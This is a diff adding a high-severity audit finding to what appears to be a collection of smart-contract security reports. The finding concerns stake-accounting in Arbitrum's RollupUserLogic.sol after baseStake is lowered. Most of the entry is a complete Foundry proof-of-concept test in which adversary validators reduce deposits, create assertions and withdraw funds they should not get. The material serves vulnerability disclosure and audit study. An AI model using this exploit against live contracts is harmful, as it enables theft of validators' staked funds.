@@ -373,3 +373,239 @@ Authors: [Eta](https://twitter.com/pwhattie), looking forward to your joining
 ```
 
 </details>
+
+## 7.[High] Adversary can make honest parties unable to retrieve their assertion stakes if the required amount is decreased
+
+### Validators steal funds
+
+- Summary: The vulnerability in RollupUserLogic.sol allows adversary validators who have lost a challenge to steal funds from honest validators by exploiting the setBaseStake function. When the baseStake is decreased, the adversary can manipulate the system by creating new assertions with a reduced stake, ultimately allowing them to withdraw more funds than they initially staked.
+
+- Impact & Recommendation: This flaw permits adversaries to exploit the system and steal from honest validators, necessitating a fix to prevent adversary validators from reclaiming their funds through the current tracking system.
+  <br> 🐬: [Source](https://code4rena.com/reports/2024-05-arbitrum-foundation#h-01-adversary-can-make-honest-parties-unable-to-retrieve-their-assertion-stakes-if-the-required-amount-is-decreased) & [Report](https://code4rena.com/reports/2024-05-arbitrum-foundation)
+
+<details><summary>POC</summary>
+
+```solidity
+    function testSuccessSetBaseStake() public {
+        vm.prank(upgradeExecutorAddr);
+        adminRollup.setBaseStake(8);
+    }
+    function testPOC_SuccessConfirmEdgeByTime() public returns (SuccessCreateChallengeData memory) {
+        SuccessCreateChallengeData memory data = testSuccessCreateChallenge();
+
+        vm.roll(userRollup.getAssertion(genesisHash).firstChildBlock + CONFIRM_PERIOD_BLOCKS + 1);
+        vm.warp(block.timestamp + CONFIRM_PERIOD_BLOCKS * 15);
+        userRollup.challengeManager().confirmEdgeByTime(
+            data.e1Id,
+            AssertionStateData(
+                data.afterState1,
+                genesisHash,
+                userRollup.bridge().sequencerInboxAccs(0)
+            )
+        );
+        bytes32 inboxAcc = userRollup.bridge().sequencerInboxAccs(0);
+        vm.roll(block.number + userRollup.challengeGracePeriodBlocks());
+        vm.prank(validator1);
+        userRollup.confirmAssertion(
+            data.assertionHash,
+            genesisHash,
+            data.afterState1,
+            data.e1Id,
+            ConfigData({
+                wasmModuleRoot: WASM_MODULE_ROOT,
+                requiredStake: BASE_STAKE,
+                challengeManager: address(challengeManager),
+                confirmPeriodBlocks: CONFIRM_PERIOD_BLOCKS,
+                nextInboxPosition: firstState.globalState.u64Vals[0]
+            }),
+            inboxAcc
+        );
+        return data;
+    }
+
+    function readStakerMap(
+        address addr
+    )
+        public
+        returns (
+            uint256 amountStaked,
+            bytes32 latestStakedAssertion,
+            uint64 index,
+            bool isStaked,
+            address withdrawalAddress
+        )
+    {
+        return (userRollup._stakerMap(addr));
+    }
+
+    function testRun_Me_POC() public {
+        /*****************
+         *****Step -1-*****
+         *****************/
+        SuccessCreateChallengeData memory data = testPOC_SuccessConfirmEdgeByTime();
+        /*@audit-info
+        - `validator1` is the honest validator
+        - `validator2` is the adversary validator (aka: Bob)
+        - `validator3` is the adversary validator (aka: Alice)
+        at this point:
+        Bob lose a challenge and his 10 wei (which is the value of the constant `BASE_STAKE`)*/
+
+        /*****************
+         *****Step -2-*****
+         *****************/
+        //Set-up
+        uint256 prevInboxCount = data.newInboxCount;
+        bytes32 prevHash = userRollup.latestConfirmed();
+        AssertionState memory beforeState;
+        beforeState = data.afterState1;
+
+        AssertionState memory afterState;
+        afterState.machineStatus = MachineStatus.FINISHED;
+        afterState.globalState.u64Vals[0] = uint64(prevInboxCount);
+
+        bytes32 inboxAcc = userRollup.bridge().sequencerInboxAccs(1); // 1 because we moved the position within message
+        bytes32 expectedAssertionHash = RollupLib.assertionHash({
+            parentAssertionHash: prevHash,
+            afterState: afterState,
+            inboxAcc: inboxAcc
+        });
+
+        bytes32 prevInboxAcc = userRollup.bridge().sequencerInboxAccs(0);
+
+        //The honest validator creats the next assertion
+        vm.prank(validator1);
+        userRollup.stakeOnNewAssertion({
+            assertion: AssertionInputs({
+                beforeStateData: BeforeStateData({
+                    sequencerBatchAcc: prevInboxAcc,
+                    prevPrevAssertionHash: genesisHash,
+                    configData: ConfigData({
+                        wasmModuleRoot: WASM_MODULE_ROOT,
+                        requiredStake: BASE_STAKE,
+                        challengeManager: address(challengeManager),
+                        confirmPeriodBlocks: CONFIRM_PERIOD_BLOCKS,
+                        nextInboxPosition: afterState.globalState.u64Vals[0]
+                    })
+                }),
+                beforeState: beforeState,
+                afterState: afterState
+            }),
+            expectedAssertionHash: expectedAssertionHash
+        });
+
+        /*****************
+         *****Step -3-*****
+         *****************/
+        //The admin call setBaseStake() to decrease the `baseStake` state variable from 10 wei to 8 wei
+        testSuccessSetBaseStake();
+
+        /*****************
+         *****Step -4-*****
+         *****************/
+        //Set-up
+        beforeState = data.afterState2;
+        afterState.machineStatus = MachineStatus.FINISHED;
+        afterState.globalState.u64Vals[0] = uint64(prevInboxCount);
+
+        // `Alice` the adversary validator creats the next assertion
+        vm.prank(validator3);
+        userRollup.newStakeOnNewAssertion({
+            tokenAmount: BASE_STAKE,
+            assertion: AssertionInputs({
+                beforeStateData: BeforeStateData({
+                    sequencerBatchAcc: prevInboxAcc,
+                    prevPrevAssertionHash: genesisHash,
+                    configData: ConfigData({
+                        wasmModuleRoot: WASM_MODULE_ROOT,
+                        requiredStake: BASE_STAKE,
+                        challengeManager: address(challengeManager),
+                        confirmPeriodBlocks: CONFIRM_PERIOD_BLOCKS,
+                        nextInboxPosition: afterState.globalState.u64Vals[0]
+                    })
+                }),
+                beforeState: beforeState,
+                afterState: afterState
+            }),
+            expectedAssertionHash: bytes32(0),
+            withdrawalAddress: validator3Withdrawal
+        });
+
+        //nb:You can check. the adversary validator `Bob` is able to withdraw his 10 wei
+        /*vm.prank(validator2);
+        userRollup.returnOldDeposit();*/
+
+        /*****************
+         *****Step -5-*****
+         *****************/
+        //`Bob` trigger `reduceDeposit()` to reduce his staked amount only to 8 wei
+        vm.prank(validator2);
+        userRollup.reduceDeposit(8);
+
+        /*****************
+         *****Step -6-*****
+         *****************/
+        //`Bob` invoke stakeOnNewAssertion() to create the first child of Alice assertion
+        //Note: `Bob` will lock only 8 wei this time
+
+        //Set-up
+        (, bytes32 latestStakedAssertion, , , ) = readStakerMap(validator2);
+        uint64 newInboxCount = uint64(_createNewBatch());
+
+        beforeState = afterState;
+        prevInboxAcc = userRollup.bridge().sequencerInboxAccs(1);
+
+        AssertionState memory afterStatePOC;
+        afterStatePOC.machineStatus = MachineStatus.FINISHED;
+        afterStatePOC.globalState.bytes32Vals[0] = keccak256(
+            abi.encodePacked(FIRST_ASSERTION_BLOCKHASH)
+        ); // blockhash
+        afterStatePOC.globalState.bytes32Vals[1] = keccak256(
+            abi.encodePacked(FIRST_ASSERTION_SENDROOT)
+        ); // sendroot
+        afterStatePOC.globalState.u64Vals[0] = newInboxCount; // inbox count
+        afterStatePOC.globalState.u64Vals[1] = 0; // pos in msg
+
+        vm.roll(block.number + 75);
+
+        vm.prank(validator2);
+
+        userRollup.stakeOnNewAssertion({
+            assertion: AssertionInputs({
+                beforeStateData: BeforeStateData({
+                    sequencerBatchAcc: prevInboxAcc,
+                    prevPrevAssertionHash: latestStakedAssertion,
+                    configData: ConfigData({
+                        wasmModuleRoot: WASM_MODULE_ROOT,
+                        requiredStake: 8,
+                        challengeManager: address(challengeManager),
+                        confirmPeriodBlocks: CONFIRM_PERIOD_BLOCKS,
+                        nextInboxPosition: afterStatePOC.globalState.u64Vals[0]
+                    })
+                }),
+                beforeState: beforeState,
+                afterState: afterStatePOC
+            }),
+            expectedAssertionHash: bytes32(0)
+        });
+
+        /*****************
+         *****Step -7-*****
+         *****************/
+        //Alice withdraw 10 wei
+        vm.prank(validator3);
+        userRollup.returnOldDeposit();
+
+        vm.prank(validator3Withdrawal);
+        uint amountWithdrawn = userRollup.withdrawStakerFunds();
+        assertEq(amountWithdrawn, 10);
+
+        //Bob withdraw 2 wei
+        vm.prank(validator2Withdrawal);
+        amountWithdrawn = userRollup.withdrawStakerFunds();
+        assertEq(amountWithdrawn, 2);
+    }
+
+
+```
+
+</details>
